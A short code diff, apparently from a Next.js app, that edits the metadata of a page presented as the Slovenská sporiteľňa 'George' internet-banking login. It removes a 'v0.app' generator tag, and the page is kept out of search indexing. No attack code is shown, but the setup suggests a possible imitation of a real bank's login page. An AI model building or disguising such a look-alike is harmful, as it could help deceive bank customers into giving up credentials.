@@ -26,7 +26,6 @@ export const viewport: Viewport = {
 export const metadata: Metadata = {
   title: 'George – nový Internetbanking – Slovenská sporiteľňa, a.s.',
   description: 'Prihláste sa do nového Internetbankingu Slovenskej sporiteľne. S Georgeom bankujete jednoduchšie a s väčším prehľadom.',
-  generator: 'v0.app',
   applicationName: 'George',
   robots: {
     index: false,
